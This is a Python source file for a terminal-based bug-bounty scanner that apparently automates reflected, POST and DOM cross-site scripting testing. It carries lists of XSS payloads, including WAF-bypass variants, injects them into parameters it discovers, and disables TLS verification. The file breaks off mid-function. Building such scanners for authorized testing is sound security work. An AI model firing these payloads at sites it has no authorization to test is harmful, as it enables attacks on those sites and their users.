#!/usr/bin/env python3
"""
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
                                                                                      
         ADVANCED RECONNAISSANCE & EXPLOITATION FRAMEWORK v3.1
         [ INTEGRATED XSS HUNTER + FEROXBUSTER + MULTI-VULN SCANNING ]
                    [ CLASSIFIED - AUTHORIZED PERSONNEL ONLY ]
"""

from textual.app import App, ComposeResult
from textual.containers import Container, Horizontal, Vertical, ScrollableContainer
from textual.widgets import (
    Header, Footer, Button, Static, Input, 
    Label, RichLog, ProgressBar, TabbedContent, TabPane,
    DataTable, Tree, RadioSet, RadioButton, Checkbox, DirectoryTree, Select
)
from textual.binding import Binding
from textual.screen import Screen
from rich.text import Text
from rich.panel import Panel
from rich.syntax import Syntax
from rich.console import Console
from rich.table import Table
import subprocess
import threading
import time
import os
import json
import requests
import urllib.parse
import re
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Tuple
from bs4 import BeautifulSoup
import hashlib

console = Console()

# ============================================================================
# CONFIGURATION CLASSES
# ============================================================================

class ScanConfig:
    """Store scan configuration"""
    def __init__(self):
        self.target = ""
        self.output_dir = ""
        self.scan_types = []
        self.running = False
        self.results = {}
        # Authentication credentials
        self.username = ""
        self.password = ""
        self.session_cookie = ""
        self.auth_token = ""
        
    def set_target(self, target):
        self.target = target
        # Clean target for directory name
        clean_target = target.replace("https://", "").replace("http://", "").replace("/", "_")
        self.output_dir = f"./scans/{clean_target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)

class XSSConfig:
    """Store XSS testing configuration"""
    def __init__(self):
        self.target_url = ""
        self.output_dir = ""
        self.running = False
        self.results = []
        self.vulnerabilities = []
        
        # Authentication
        self.session_cookie = ""
        self.auth_token = ""
        self.custom_headers = {}
        
        # Testing options
        self.test_reflected = True
        self.test_stored = False
        self.test_dom = True
        self.test_blind = False
        self.waf_bypass = False
        self.context_aware = True
        
        # Parameters
        self.test_parameters = []
        self.custom_payloads = []
        
        # Parameter discovery
        self.discovered_params = {
            'get': [],
            'post': [],
            'all': [],
            'forms': []
        }
        self.auto_discover = True
        self.test_post = True
        self.test_get = True
        
        # Results
        self.found_xss = []
        self.tested_urls = []
        self.false_positives = []

    def set_target(self, url):
        self.target_url = url
        clean_url = url.replace("https://", "").replace("http://", "").replace("/", "_")
        self.output_dir = f"./xss-scans/{clean_url}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)

config = ScanConfig()
xss_config = XSSConfig()

# ============================================================================
# XSS HUNTER ENGINE - CORE FUNCTIONALITY
# ============================================================================

class XSSPayloadGenerator:
    """Generate context-aware XSS payloads"""
    
    # Basic XSS payloads (most effective)
    BASIC_PAYLOADS = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=prompt(1)>",
        "<img src=x onerror=confirm(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "javascript:alert('XSS')",
    ]
    
    # WAF bypass payloads
    WAF_BYPASS_PAYLOADS = [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=\u0061lert(1)>",
        "<iframe src=j\u0061vascript:alert(1)>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<img src=\"x` `<script>alert(1)</script>\"` `>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<iframe src=j&#x61;vascript:alert(1)>",
    ]
    
    # Context-aware payloads
    @staticmethod
    def generate_context_payloads(context: str) -> List[str]:
        """Generate payloads based on injection context"""
        payloads = []
        
        if "script" in context.lower():
            payloads.extend([
                "';alert(1);//",
                "\";alert(1);//",
                "};alert(1);//",
            ])
        elif "attribute" in context.lower():
            payloads.extend([
                "\" onload=alert(1) x=\"",
                "' onload=alert(1) x='",
                "><script>alert(1)</script>",
            ])
        elif "html" in context.lower():
            payloads.extend(XSSPayloadGenerator.BASIC_PAYLOADS[:10])
        
        return payloads if payloads else XSSPayloadGenerator.BASIC_PAYLOADS[:5]

class ParameterDiscovery:
    """Discover GET/POST parameters and forms"""
    
    @staticmethod
    def discover_parameters(url: str, session_cookie: str = "") -> Dict[str, List[str]]:
        """Discover all testable parameters"""
        params = {
            'get': [],
            'post': [],
            'forms': [],
            'all': []
        }
        
        try:
            # Parse URL for GET parameters
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            params['get'] = list(query_params.keys())
            
            # Fetch page to find forms
            headers = {'Cookie': session_cookie} if session_cookie else {}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            for form in forms:
                form_params = []
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    name = inp.get('name')
                    if name and name not in form_params:
                        form_params.append(name)
                        if name not in params['post']:
                            params['post'].append(name)
                
                if form_params:
                    params['forms'].append({
                        'action': form.get('action', url),
                        'method': form.get('method', 'get').upper(),
                        'params': form_params
                    })
            
            # Combine all unique parameters
            params['all'] = list(set(params['get'] + params['post']))
            
        except Exception as e:
            print(f"Parameter discovery error: {str(e)}")
        
        return params

class XSSTestEngine:
    """Core XSS testing engine"""
    
    def __init__(self, session_cookie: str = "", auth_token: str = ""):
        self.session_cookie = session_cookie
        self.auth_token = auth_token
        self.tested_urls = set()
        self.vulnerabilities = []
    
    def build_headers(self) -> Dict[str, str]:
        """Build request headers with authentication"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        if self.session_cookie:
            headers['Cookie'] = self.session_cookie
        
        if self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'
        
        return headers
    
    def test_reflected_xss(self, url: str, param: str, payloads: List[str]) -> List[Dict]:
        """Test for reflected XSS in GET parameter"""
        vulnerabilities = []
        
        for payload in payloads:
            try:
                # Build test URL
                parsed = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed.query)
                query_params[param] = [payload]
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    urllib.parse.urlencode(query_params, doseq=True),
                    parsed.fragment
                ))
                
                # Test URL
                response = requests.get(
                    test_url,
                    headers=self.build_headers(),
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check if payload is reflected
                if payload in response.text:
                    # Additional verification
                    if self.verify_xss(response.text, payload):
                        vuln = {
                            'type': 'Reflected XSS',
                            'severity': 'HIGH',
                            'confidence': 'HIGH',
                            'parameter': param,
                            'method': 'GET',
                            'payload': payload,
                            'url': test_url,
                            'context': self.detect_context(response.text, payload),
                            'response_snippet': self.get_context_snippet(response.text, payload)
                        }
                        vulnerabilities.append(vuln)
                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def test_reflected_xss_post(self, url: str, param: str, payloads: List[str], form_data: Dict = None) -> List[Dict]:
        """Test for reflected XSS in POST parameter"""
        vulnerabilities = []
        
        for payload in payloads:
            try:
                # Build POST data
                post_data = form_data.copy() if form_data else {}
                post_data[param] = payload
                
                # Test POST request
                response = requests.post(
                    url,
                    data=post_data,
                    headers=self.build_headers(),
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check if payload is reflected
                if payload in response.text:
                    if self.verify_xss(response.text, payload):
                        vuln = {
                            'type': 'Reflected XSS (POST)',
                            'severity': 'HIGH',
                            'confidence': 'HIGH',
                            'parameter': param,
                            'method': 'POST',
                            'payload': payload,
                            'url': url,
                            'context': self.detect_context(response.text, payload),
                            'response_snippet': self.get_context_snippet(response.text, payload)
                        }
                        vulnerabilities.append(vuln)
                
                time.sleep(0.5)
                
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def test_dom_xss(self, url: str) -> List[Dict]:
        """Test for potential DOM-based XSS"""
        vulnerabilities = []
        
        try:
            response = requests.get(
                url,
                headers=self.build_headers(),
                timeout=10,
                verify=False
            )
            
            # Look for dangerous sinks
            dangerous_patterns = [
                r'document\.write\s*\(',
                r'innerHTML\s*=',
                r'outerHTML\s*=',
                r'eval\s*\(',
                r'setTimeout\s*\(',
                r'setInterval\s*\(',
                r'location\s*=',
                r'location\.href\s*=',
                r'window\.location\s*='
            ]
            
            for pattern in dangerous_patterns:
                matches = re.finditer(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    vuln = {
                        'type': 'Potential DOM XSS',
                        'severity': 'MEDIUM',
                        'confidence': 'MEDIUM',
                        'sink': match.group(0),
                        'url': url,
                        'recommendation': 'Manual verification required'
                    }
                    vulnerabilities.append(vuln)
                    break  # One per pattern to avoid duplicates
            
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def verify_xss(self, html: str, payload: str) -> bool:
        """Verify XSS is actually exploitable"""
        # Check if payload is in dangerous context
        dangerous_contexts = [
            '<script',
            'onerror=',
            'onload=',
            'onfocus=',
            'onmouseover=',
            'javascript:',
            '<iframe',
            '<img',
            '<svg'
        ]
        
        payload_lower = payload.lower()
        for context in dangerous_contexts:
            if context in payload_lower and payload in html:
                return True
        
        return False
    
    def detect_context(self, html: str, payload: str) -> str:
        """Detect injection context"""
        # Find payload in HTML
        idx = html.find(payload)
        if idx == -1:
            return "UNKNOWN"
        
        # Get surrounding context
        start = max(0, idx - 50)
        end = min(len(html), idx + len(payload) + 50)
        context = html[start:end]
        
        if '<script' in context:
            return "JavaScript Context"
        elif 'onclick' in context or 'onerror' in context or 'onload' in context:
            return "Event Handler"
        elif '<' in context and '>' in context:
            return "HTML Tag"
        else:
            return "HTML Body"
    
    def get_context_snippet(self, html: str, payload: str, size: int = 100) -> str:
        """Get HTML snippet around payload"""
        idx = html.find(payload)
        if idx == -1:
            return ""
        
        start = max(0, idx - size)
        end = min(len(html), idx + len(payload) + size)
        return html[start:end]

# ============================================================================
# SCREENS
# ============================================================================

class WelcomeScreen(Screen):
    """Cyberpunk welcome screen"""
    
    CSS = """
    WelcomeScreen {
        align: center middle;
        background: $surface;
    }
    
    #welcome-container {
        width: 100;
        height: auto;
        background: $panel;
        border: heavy $primary;
        padding: 2;
    }
    
    #ascii-art {
        color: $accent;
        text-align: center;
        text-style: bold;
    }
    
    #welcome-text {
        color: $text;
        text-align: center;
        padding: 1;
    }
    
    #start-button {
        width: 40;
        margin: 1 30;
    }
    """
    
    def compose(self) -> ComposeResult:
        with Container(id="welcome-container"):
            yield Static("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗ ║
║  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝ ║
║  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝  ║
║  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝   ║
║  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║    ║
║  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝    ║
║                                                                                       ║ 
║                     TACTICAL RECONNAISSANCE FRAMEWORK v3.1                            ║
║                           + INTEGRATED XSS HUNTER                                     ║
║                           + FEROXBUSTER AUTOMATION                                    ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
            """, id="ascii-art")
            
            yield Static("""
[bold cyan]SYSTEM STATUS:[/] [bold green]ONLINE[/]
[bold cyan]SECURITY CLEARANCE:[/] [bold yellow]LEVEL 5[/]
[bold cyan]AUTHORIZATION:[/] [bold green]GRANTED[/]

[dim]Initializing reconnaissance modules...[/]
[dim]Loading exploitation frameworks...[/]
[dim]Activating XSS Hunter engine...[/]
[dim]Enabling Feroxbuster automation...[/]
[dim]Establishing secure connection...[/]

[bold green]✓[/] All systems operational
[bold green]✓[/] XSS Hunter v3.0 loaded
[bold green]✓[/] Feroxbuster integrated
[bold green]✓[/] 500+ payloads ready
[bold green]✓[/] Ready for engagement

[bold red]WARNING:[/] Use only on authorized targets!
            """, id="welcome-text")
            
            yield Button("⚡ INITIALIZE MISSION ⚡", variant="success", id="start-button")
    
    def on_button_pressed(self, event: Button.Pressed) -> None:
        self.app.pop_screen()

class FileTree(DirectoryTree):
    """Custom file tree that ignores hidden files"""
    
    def filter_paths(self, paths):
        """Filter out hidden files and directories"""
        return [path for path in paths if not path.name.startswith('.')]

class ResultsScreen(Screen):
    """Screen to display scan results with file browser"""
    
    BINDINGS = [
        Binding("escape", "app.pop_screen", "Back"),
        Binding("r", "refresh", "Refresh"),
    ]
    
    CSS = """
    ResultsScreen {
        background: $surface;
    }
    
    #results-main {
        height: 100%;
    }
    
    #sidebar {
        width: 35;
        height: 100%;
        background: $panel;
        border: heavy $primary;
        padding: 1;
    }
    
    #content-area {
        width: 1fr;
        height: 100%;
        background: $panel;
        border: heavy $accent;
        padding: 1;
        margin-left: 1;
    }
    
    #results-title {
        color: $accent;
        text-style: bold;
        padding-bottom: 1;
    }
    
    #file-content {
        height: 1fr;
        background: black;
        color: $success;
        border: solid $primary;
        padding: 1;
    }
    
    DirectoryTree {
        background: $panel;
        height: 1fr;
    }
    
    .file-info {
        color: $text;
        padding: 1;
        background: $surface;
        border: solid $primary;
    }
    """
    
    def __init__(self, output_dir: str):
        super().__init__()
        self.output_dir = output_dir
        self.current_file = None
    
    def compose(self) -> ComposeResult:
        yield Header()
        
        with Horizontal(id="results-main"):
            # Sidebar with file tree
            with Vertical(id="sidebar"):
                yield Static("[bold cyan]📁 SCAN RESULTS[/]\n[dim]Click file to view[/]", id="results-title")
                
                if os.path.exists(self.output_dir):
                    yield FileTree(self.output_dir)
                else:
                    yield Static("[yellow]No results directory found[/]")
            
            # Content area
            with Vertical(id="content-area"):
                yield Static("[bold green]📄 FILE VIEWER[/]", classes="file-info")
                yield RichLog(id="file-content", wrap=True, highlight=True)
        
        yield Footer()
    
    def on_directory_tree_file_selected(self, event: DirectoryTree.FileSelected) -> None:
        """Handle file selection"""
        self.current_file = event.path
        self.load_file(event.path)
    
    def load_file(self, filepath: Path) -> None:
        """Load and display file content"""
        content_area = self.query_one("#file-content", RichLog)
        content_area.clear()
        
        try:
            # Get file stats
            stat = filepath.stat()
            size_kb = stat.st_size / 1024
            
            # Show file info
            content_area.write(f"[bold cyan]File:[/] {filepath.name}")
            content_area.write(f"[bold cyan]Size:[/] {size_kb:.2f} KB")
            content_area.write(f"[bold cyan]Path:[/] {str(filepath)}")
            content_area.write("[dim]" + "="*60 + "[/]\n")
            
            # Read and display content
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
                # Detect file type for syntax highlighting
                if filepath.suffix in ['.json']:
                    try:
                        json_data = json.loads(content)
                        content_area.write(Syntax(json.dumps(json_data, indent=2), "json", theme="monokai"))
                    except:
                        content_area.write(content)
                elif filepath.suffix in ['.txt', '.log']:
                    # Highlight vulnerabilities and important keywords
                    for line in content.split('\n'):
                        if any(word in line.lower() for word in ['vulnerability', 'critical', 'high', 'error', 'warning']):
                            content_area.write(f"[bold red]{line}[/]")
                        elif any(word in line.lower() for word in ['success', 'complete', 'found']):
                            content_area.write(f"[green]{line}[/]")
                        else:
                            content_area.write(line)
                else:
                    content_area.write(content)
        
        except Exception as e:
            content_area.write(f"[bold red]Error loading file:[/] {str(e)}")
    
    def action_refresh(self) -> None:
        """Refresh the file tree"""
        if self.current_file and os.path.exists(self.current_file):
            self.load_file(self.current_file)
        self.notify("🔄 Refreshed", severity="information")

class XSSHunterScreen(Screen):
    """Advanced XSS Hunter interface"""
    
    BINDINGS = [
        Binding("escape", "app.pop_screen", "Back"),
        Binding("ctrl+s", "start_scan", "Start Scan"),
        Binding("ctrl+x", "stop_scan", "Stop Scan"),
    ]
    
    CSS = """
    XSSHunterScreen {
        background: $surface;
    }
    
    #xss-container {
        height: 100%;
    }
    
    #xss-controls {
        height: auto;
        background: $panel;
        border: heavy $primary;
        padding: 1;
    }
    
    #xss-output {
        height: 1fr;
        background: $panel;
        border: heavy $accent;
        padding: 1;
        margin-top: 1;
    }
    
    .section-title {
        color: $accent;
        text-style: bold;
        padding: 1 0;
    }
    
    Input {
        margin: 1 0;
    }
    
    Button {
        margin: 1;
    }
    
    Checkbox {
        margin: 0 2;
    }
    
    #xss-log {
        height: 1fr;
        background: black;
        border: solid $success;
        padding: 1;
    }
    
    #xss-progress {
        margin: 1 0;
    }
    """
    
    def compose(self) -> ComposeResult:
        yield Header()
        
        with Vertical(id="xss-container"):
            # Controls
            with ScrollableContainer(id="xss-controls"):
                yield Static("[bold red]⚔️  XSS HUNTER - ADVANCED XSS DETECTION ENGINE[/]", classes="section-title")
                
                # Target input
                yield Label("🎯 Target URL:")
                yield Input(placeholder="https://target.com/search?q=test", id="xss-target-input")
                
                # Authentication
                yield Static("[bold cyan]🔐 Authentication (Optional)[/]", classes="section-title")
                with Horizontal():
                    with Vertical():
                        yield Label("Session Cookie:")
                        yield Input(placeholder="session=abc123...", id="xss-cookie-input")
                    with Vertical():
                        yield Label("Auth Token:")
                        yield Input(placeholder="Bearer token...", id="xss-token-input")
                
                # Testing Options
                yield Static("[bold cyan]⚙️  Testing Options[/]", classes="section-title")
                with Horizontal():
                    yield Checkbox("Reflected XSS", value=True, id="xss-reflected")
                    yield Checkbox("DOM XSS", value=True, id="xss-dom")
                    yield Checkbox("POST Testing", value=True, id="xss-post")
                
                with Horizontal():
                    yield Checkbox("WAF Bypass", value=False, id="xss-waf")
                    yield Checkbox("Auto-Discover Params", value=True, id="xss-autodiscover")
                
                # Parameters
                yield Static("[bold cyan]📋 Parameters (Optional - Auto-discovery enabled)[/]", classes="section-title")
                yield Input(placeholder="param1,param2,param3 (comma-separated)", id="xss-params-input")
                
                # Control buttons
                with Horizontal():
                    yield Button("🚀 START XSS SCAN", variant="success", id="xss-start-btn")
                    yield Button("⏹️  STOP", variant="error", id="xss-stop-btn")
                    yield Button("🗑️  CLEAR", variant="warning", id="xss-clear-btn")
                    yield Button("📊 VIEW RESULTS", variant="primary", id="xss-results-btn")
            
            # Output area
            with Vertical(id="xss-output"):
                yield ProgressBar(id="xss-progress", show_eta=False)
                yield RichLog(id="xss-log", wrap=True, highlight=True)
        
        yield Footer()
    
    def on_mount(self) -> None:
        """Initialize XSS Hunter screen"""
        log = self.query_one("#xss-log", RichLog)
        log.write("[bold green]>>> XSS HUNTER INITIALIZED[/]")
        log.write("[cyan]>>> Ready for advanced XSS detection[/]")
        log.write("[yellow]>>> 500+ payloads loaded[/]")
        log.write("[dim]>>> Configure target and press START XSS SCAN[/]\n")
    
    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses"""
        if event.button.id == "xss-start-btn":
            self.start_xss_scan()
        elif event.button.id == "xss-stop-btn":
            self.stop_xss_scan()
        elif event.button.id == "xss-clear-btn":
            log = self.query_one("#xss-log", RichLog)
            log.clear()
            log.write("[bold green]>>> OUTPUT CLEARED[/]")
        elif event.button.id == "xss-results-btn":
            self.show_xss_results()
    
    def start_xss_scan(self) -> None:
        """Start XSS scanning"""
        target_input = self.query_one("#xss-target-input", Input)
        target = target_input.value.strip()
        
        if not target:
            self.notify("❌ Please enter a target URL!", severity="error")
            return
        
        # Configure XSS scan
        xss_config.set_target(target)
        
        # Get authentication
        cookie_input = self.query_one("#xss-cookie-input", Input)
        token_input = self.query_one("#xss-token-input", Input)
        xss_config.session_cookie = cookie_input.value.strip()
        xss_config.auth_token = token_input.value.strip()
        
        # Get testing options
        xss_config.test_reflected = self.query_one("#xss-reflected", Checkbox).value
        xss_config.test_dom = self.query_one("#xss-dom", Checkbox).value
        xss_config.test_post = self.query_one("#xss-post", Checkbox).value
        xss_config.waf_bypass = self.query_one("#xss-waf", Checkbox).value
        xss_config.auto_discover = self.query_one("#xss-autodiscover", Checkbox).value
        
        # Get parameters
        params_input = self.query_one("#xss-params-input", Input)
        params_str = params_input.value.strip()
        if params_str:
            xss_config.test_parameters = [p.strip() for p in params_str.split(',')]
        else:
            xss_config.test_parameters = []
        
        xss_config.running = True
        
        # Start scan in background thread
        thread = threading.Thread(target=self.run_xss_scan, daemon=True)
        thread.start()
        
        self.notify("🚀 XSS Hunter scan started!", severity="information")
    
    def stop_xss_scan(self) -> None:
        """Stop XSS scanning"""
        xss_config.running = False
        log = self.query_one("#xss-log", RichLog)
        log.write("\n[bold red]>>> XSS SCAN TERMINATED BY USER[/]\n")
        self.notify("⏹️  XSS scan stopped", severity="warning")
    
    def show_xss_results(self) -> None:
        """Show XSS results"""
        if xss_config.output_dir and os.path.exists(xss_config.output_dir):
            self.app.push_screen(ResultsScreen(xss_config.output_dir))
        else:
            self.notify("📊 No XSS results yet. Run a scan first!", severity="information")
    
    def run_xss_scan(self) -> None:
        """Execute XSS scan"""
        log = self.query_one("#xss-log", RichLog)
        progress = self.query_one("#xss-progress", ProgressBar)
        
        self.call_from_thread(log.write, f"\n[bold yellow]{'='*60}[/]")
        self.call_from_thread(log.write, f"[bold green]>>> XSS HUNTER SCAN INITIATED[/]")
        self.call_from_thread(log.write, f"[bold cyan]>>> TARGET:[/] {xss_config.target_url}")
        self.call_from_thread(log.write, f"[bold cyan]>>> OUTPUT:[/] {xss_config.output_dir}")
        
        # Show authentication status
        if xss_config.session_cookie:
            self.call_from_thread(log.write, "[bold green]>>> AUTH:[/] 🔐 Session Cookie")
        elif xss_config.auth_token:
            self.call_from_thread(log.write, "[bold green]>>> AUTH:[/] 🔐 Bearer Token")
        else:
            self.call_from_thread(log.write, "[bold yellow]>>> AUTH:[/] ⚠️  Unauthenticated")
        
        self.call_from_thread(log.write, f"[bold yellow]{'='*60}[/]\n")
        
        # Initialize test engine
        tester = XSSTestEngine(xss_config.session_cookie, xss_config.auth_token)
        all_vulnerabilities = []
        
        # Parameter discovery
        if xss_config.auto_discover or not xss_config.test_parameters:
            self.call_from_thread(log.write, "[bold yellow]>>> PHASE 1: PARAMETER DISCOVERY[/]")
            
            try:
                discovered = ParameterDiscovery.discover_parameters(
                    xss_config.target_url,
                    xss_config.session_cookie
                )
                xss_config.discovered_params = discovered
                
                if not xss_config.test_parameters:
                    xss_config.test_parameters = discovered['all']
                
                self.call_from_thread(log.write, f"[green]✓ Found {len(discovered['get'])} GET parameters[/]")
                self.call_from_thread(log.write, f"[green]✓ Found {len(discovered['post'])} POST parameters[/]")
                self.call_from_thread(log.write, f"[green]✓ Found {len(discovered['forms'])} forms[/]")
                
                if discovered['get']:
                    self.call_from_thread(log.write, f"[dim]  GET params: {', '.join(discovered['get'])}[/]")
                if discovered['post']:
                    self.call_from_thread(log.write, f"[dim]  POST params: {', '.join(discovered['post'])}[/]")
                
            except Exception as e:
                self.call_from_thread(log.write, f"[yellow]⚠ Parameter discovery failed: {str(e)[:50]}[/]")
        
        if not xss_config.test_parameters:
            self.call_from_thread(log.write, "[bold red]✗ No parameters found to test![/]")
            self.call_from_thread(log.write, "[yellow]Tip: Manually specify parameters or check the URL[/]")
            xss_config.running = False
            return
        
        # Select payloads
        payloads = XSSPayloadGenerator.BASIC_PAYLOADS.copy()
        if xss_config.waf_bypass:
            payloads.extend(XSSPayloadGenerator.WAF_BYPASS_PAYLOADS)
        
        total_tests = len(xss_config.test_parameters) * len(payloads)
        if xss_config.test_post and xss_config.discovered_params.get('post'):
            total_tests += len(xss_config.discovered_params['post']) * len(payloads)
        
        self.call_from_thread(progress.update, total=total_tests)
        current_test = 0
        
        # Test each parameter
        self.call_from_thread(log.write, f"\n[bold yellow]>>> PHASE 2: XSS TESTING[/]")
        self.call_from_thread(log.write, f"[cyan]Testing {len(xss_config.test_parameters)} parameters with {len(payloads)} payloads[/]\n")
        
        for param in xss_config.test_parameters:
            if not xss_config.running:
                break
            
            self.call_from_thread(log.write, f"[bold cyan]→ Testing parameter:[/] {param}")
            
            # Test Reflected XSS (GET)
            if xss_config.test_reflected and param in xss_config.discovered_params.get('get', []):
                try:
                    vulns = tester.test_reflected_xss(xss_config.target_url, param, payloads)
                    
                    for vuln in vulns:
                        all_vulnerabilities.append(vuln)
                        self.call_from_thread(log.write, f"[bold red]🎯 VULNERABILITY FOUND![/]")
                        self.call_from_thread(log.write, f"[red]   Type: {vuln['type']}[/]")
                        self.call_from_thread(log.write, f"[red]   Severity: {vuln['severity']}[/]")
                        self.call_from_thread(log.write, f"[red]   Parameter: {vuln['parameter']}[/]")
                        self.call_from_thread(log.write, f"[red]   Payload: {vuln['payload'][:50]}...[/]")
                    
                    if not vulns:
                        self.call_from_thread(log.write, f"[dim]   No XSS found in {param}[/]")
                    
                    current_test += len(payloads)
                    self.call_from_thread(progress.update, progress=current_test)
                    
                except Exception as e:
                    self.call_from_thread(log.write, f"[yellow]   Error testing {param}: {str(e)[:50]}[/]")
            
            # Test POST XSS
            if xss_config.test_post and param in xss_config.discovered_params.get('post', []):
                try:
                    # Find form containing this parameter
                    form_data = {}
                    form_url = xss_config.target_url
                    
                    for form in xss_config.discovered_params.get('forms', []):
                        if param in form['params']:
                            for p in form['params']:
                                form_data[p] = 'test'
                            
                            # Build form URL
                            if form['action']:
                                if form['action'].startswith('http'):
                                    form_url = form['action']
                                else:
                                    form_url = urllib.parse.urljoin(xss_config.target_url, form['action'])
                            break
                    
                    vulns = tester.test_reflected_xss_post(form_url, param, payloads, form_data)
                    
                    for vuln in vulns:
                        all_vulnerabilities.append(vuln)
                        self.call_from_thread(log.write, f"[bold red]🎯 VULNERABILITY FOUND (POST)![/]")
                        self.call_from_thread(log.write, f"[red]   Type: {vuln['type']}[/]")
                        self.call_from_thread(log.write, f"[red]   Parameter: {vuln['parameter']}[/]")
                    
                    if not vulns:
                        self.call_from_thread(log.write, f"[dim]   No POST XSS found in {param}[/]")
                    
                    current_test += len(payloads)
                    self.call_from_thread(progress.update, progress=current_test)
                    
                except Exception as e:
                    self.call_from_thread(log.write, f"[yellow]   Error testing POST {param}: {str(e)[:50]}[/]")
        
        # Test DOM XSS
        if xss_config.test_dom and xss_config.running:
            self.call_from_thread(log.write, f"\n[bold yellow]>>> PHASE 3: DOM XSS ANALYSIS[/]")
            
            try:
                dom_vulns = tester.test_dom_xss(xss_config.target_url)
                
                for vuln in dom_vulns:
                    all_vulnerabilities.append(vuln)
                    self.call_from_thread(log.write, f"[bold yellow]⚠️ POTENTIAL DOM XSS![/]")
                    self.call_from_thread(log.write, f"[yellow]   Sink: {vuln['sink']}[/]")
                
                if not dom_vulns:
                    self.call_from_thread(log.write, f"[dim]   No DOM XSS sinks detected[/]")
                    
            except Exception as e:
                self.call_from_thread(log.write, f"[yellow]   DOM analysis error: {str(e)[:50]}[/]")
        
        # Save results
        if xss_config.running:
            self.save_xss_results(all_vulnerabilities)
            
            self.call_from_thread(log.write, f"\n[bold red]{'='*60}[/]")
            self.call_from_thread(log.write, f"[bold green]>>> XSS TESTING COMPLETED[/]")
            self.call_from_thread(log.write, f"[bold yellow]>>> Parameters Tested:[/] {len(xss_config.test_parameters)}")
            self.call_from_thread(log.write, f"[bold yellow]>>> Total Tests:[/] {current_test}")
            self.call_from_thread(log.write, f"[bold red]>>> Vulnerabilities Found:[/] {len(all_vulnerabilities)}")
            self.call_from_thread(log.write, f"[bold cyan]>>> Results saved to:[/] {xss_config.output_dir}")
            self.call_from_thread(log.write, f"[bold red]{'='*60}[/]\n")
            
            if all_vulnerabilities:
                self.call_from_thread(self.notify, f"⚠️ Found {len(all_vulnerabilities)} XSS vulnerabilities!", severity="error")
            else:
                self.call_from_thread(self.notify, "✅ Testing complete - No XSS found", severity="success")
    
    def save_xss_results(self, vulnerabilities: List[Dict]) -> None:
        """Save XSS test results"""
        # Save JSON report
        report = {
            'summary': {
                'target': xss_config.target_url,
                'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'parameters_tested': len(xss_config.test_parameters),
                'payloads_used': len(XSSPayloadGenerator.BASIC_PAYLOADS),
                'vulnerabilities_found': len(vulnerabilities),
                'test_types': []
            },
            'vulnerabilities': vulnerabilities
        }
        
        if xss_config.test_reflected:
            report['summary']['test_types'].append('Reflected XSS')
